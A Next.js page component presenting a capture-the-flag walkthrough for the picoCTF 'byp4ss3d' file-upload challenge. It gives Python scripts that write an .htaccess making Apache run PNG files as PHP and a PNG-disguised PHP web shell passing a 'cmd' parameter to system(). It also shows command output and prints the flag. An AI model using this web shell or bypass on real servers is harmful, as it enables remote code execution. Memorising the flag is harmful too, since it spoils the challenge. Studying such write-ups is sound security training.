import Image from 'next/image'

export default function Byp4ss3d() {
  return (
    <div className="space-y-8">
      {/* Header Section */}
      <div className="bg-gradient-to-r from-orange-50 to-red-100 rounded-2xl p-8 border-l-4 border-orange-500">
        <h1 className="text-4xl font-bold text-gray-900 mb-4">byp4ss3d</h1>
        <p className="text-xl text-gray-700 leading-relaxed">
          A university's online registration portal asks students to upload their ID cards for verification. 
          The developer put some filters in place to ensure only image files are uploaded but are they enough?
        </p>
      </div>

      {/* Information Section */}
      <div className="bg-white rounded-xl shadow-lg p-8 border border-gray-200">
        <h2 className="text-3xl font-bold text-blue-900 mb-6 border-l-4 border-blue-500 pl-4">Information Given</h2>
        
        <div className="space-y-6">
          <div>
            <h3 className="text-2xl font-bold text-green-700 mb-4">Description</h3>
            <p className="text-gray-700 leading-relaxed text-lg">
              A university's online registration portal asks students to upload their ID cards for verification. 
              The developer put some filters in place to ensure only image files are uploaded but are they enough? 
              Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact 
              with the server in ways you shouldn't.
            </p>
            <p className="mt-4 text-gray-600">
              Additional details will be available after launching your challenge instance.
            </p>
          </div>

          <div>
            <h3 className="text-2xl font-bold text-green-700 mb-4">Hints</h3>
            <ul className="space-y-2 text-gray-700">
              <li>• Apache can be tricked into executing non-PHP files as PHP with a <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">.htaccess</code> file.</li>
              <li>• Try uploading more than just one file.</li>
            </ul>
          </div>
        </div>
      </div>

      {/* Upload File Section */}
      <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-xl p-8 text-green-400 shadow-2xl">
        <h2 className="text-3xl font-bold text-white mb-6">Upload File</h2>
        
        <div className="space-y-6">
          <p className="text-green-300 text-lg">
            As you can see we are greeted with a website:
          </p>
          
          <div className="flex justify-center">
            <Image
              src="/images/Screenshot 2025-10-01 at 20.24.02.png"
              alt="Upload website interface"
              width={600}
              height={400}
              className="rounded-lg shadow-md"
            />
          </div>
          
          <p className="text-green-300 text-lg">
            We need to upload a file with a payload in order to get RCE (Remote Code Execution, this lets us run commands on the web server).
          </p>
          
          <p className="text-green-300 text-lg">
            Remember that the hint stated that <code className="bg-gray-700 text-yellow-300 px-2 py-1 rounded">.htaccess</code> needs to be uploaded in order to even upload another file which lets us execute commands on the web server.
          </p>
          
          <p className="text-green-300 text-lg">
            To make the <code className="bg-gray-700 text-yellow-300 px-2 py-1 rounded">.htaccess</code> file:
          </p>
          
          <div className="bg-gray-800 rounded-lg p-6">
            <pre className="text-green-400 font-mono text-sm">
{`#!/usr/bin/env python3

def create_htaccess():
    htaccess_content = '''
AddType application/x-httpd-php .png
php_flag engine on
'''
    
    with open('.htaccess', 'w') as f:
        f.write(htaccess_content)
    print("[+] Created .htaccess file")

create_htaccess()`}
            </pre>
          </div>
          
          <p className="text-green-300 text-lg">
            Then upload the file.
          </p>
          
          <p className="text-green-300 text-lg">
            After uploading that we need to upload a png file with a payload letting us execute commands. To do this use this python script:
          </p>
          
          <div className="bg-gray-800 rounded-lg p-6">
            <pre className="text-green-400 font-mono text-sm">
{`#!/usr/bin/env python3

def create_php_shell_png():
    # Simple PHP web shell that will execute when accessed
    php_shell = b'''\\x89PNG\\r\\n\\x1a\\n<?php
if(isset($_REQUEST['cmd'])) {
    header("Content-Type: text/plain");
    system($_REQUEST['cmd']);
    die();
}
echo "PNG Image";
?>
'''
    
    with open('shell.png', 'wb') as f:
        f.write(php_shell)
    
    print("[+] Created PHP shell as shell.png")

create_php_shell_png()`}
            </pre>
          </div>
          
          <p className="text-green-300 text-lg">
            Then upload that and visit:
          </p>
          
          <div className="bg-gray-800 rounded-lg p-4">
            <code className="text-yellow-400 font-mono">
              http://your-pico-info-target-whatever/images/shell.png?cmd=id
            </code>
          </div>
          
          <p className="text-green-300 text-lg">
            And you will see:
          </p>
          
          <div className="bg-gray-800 rounded-lg p-4">
            <pre className="text-green-400 font-mono text-sm">
{`PNG  
**Warning**: Cannot modify header information - headers already sent by (output started at /var/www/html/images/shell.png:1) in **/var/www/html/images/shell.png** on line **5**  
uid=33(www-data) gid=33(www-data) groups=33(www-data)`}
            </pre>
          </div>
          
          <p className="text-green-300 text-lg">
            Now to read the flag:
          </p>
          
          <div className="bg-gray-800 rounded-lg p-4">
            <code className="text-yellow-400 font-mono">
              http://amiable-citadel.picoctf.net:64056/images/shell.png?cmd=cat+../../flag.txt
            </code>
          </div>
          
          <div className="bg-gray-800 rounded-lg p-4 mt-4">
            <pre className="text-green-400 font-mono text-sm">
{`OUTPUT:

PNG  
**Warning**: Cannot modify header information - headers already sent by (output started at /var/www/html/images/shell.png:1) in **/var/www/html/images/shell.png** on line **5**  
picoCTF{s3rv3r_byp4ss_77c49c68}`}
            </pre>
          </div>
          
          <p className="text-green-300 text-lg">
            So the flag is: <code className="bg-gray-700 text-yellow-300 px-2 py-1 rounded">picoCTF{s3rv3r_byp4ss_77c49c68}</code>.
          </p>
        </div>
      </div>

      {/* Flag Section */}
      <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-xl p-8 border-l-4 border-green-500">
        <h2 className="text-3xl font-bold text-green-800 mb-6">The Flag</h2>
        <div className="bg-gradient-to-r from-green-600 to-emerald-600 text-white p-6 rounded-xl font-mono text-xl font-bold shadow-lg">
          picoCTF{'{'}s3rv3r_byp4ss_77c49c68{'}'}
        </div>
      </div>
    </div>
  )
}